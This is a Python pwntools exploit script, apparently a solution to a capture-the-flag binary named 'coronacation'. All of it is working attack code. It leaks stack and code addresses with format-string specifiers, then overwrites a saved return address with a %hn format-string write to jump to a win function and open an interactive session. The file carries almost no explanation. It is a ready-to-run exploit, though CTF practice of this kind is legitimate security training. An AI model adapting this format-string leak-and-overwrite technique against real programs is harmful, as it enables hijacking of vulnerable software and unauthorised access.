from pwn import *

#p=remote('ctf.umbccd.io', 4300)
p = process("./coronacation")
reference_payload = 'AAAAAAAABBBBBBBBCCCCCCCC%11111x%8$hn%12312x%9hn%12312x%10hn'

def leak_stack(r):
	payload = "1|%9$p|%14$p|"
	#raw_input("continue?")
	p.sendlineafter('2. Tell everyone not to panic. It\'s just the Fake News media freaking out.\n',payload)
	leak =  p.recvline()
	text = int(leak.split("|")[1],16) 
	stack = int(leak.split("|")[2],16)
	print "actual return addr of close_borders: "+ hex(text - 135)
	return text,stack

def exploit(r):
	text,stack = leak_stack(r)
	win = text - 880
	retAddr = stack - 88
	padd = '0x'
	low_short = int(padd+hex(win)[10::],16)
	print "low_short to overwrite: " +hex(low_short)
	print "low_short to overwrite in int: " +str(low_short)
	print "Win addr: " + hex(win)
	print "Return of close_borders add: "+ hex(retAddr)

	raw_input()
	payload = "11111111"
	payload += "%"+str(low_short-8)+"x%9$hnBBBB"
	payload += p64(retAddr)
	print p64(retAddr)
	print len(payload)
	

	r.sendlineafter("2. Make it a national emergency. Show the people we don't need Bernie's healthcare plan.\n",payload)
	r.interactive()

exploit(p)
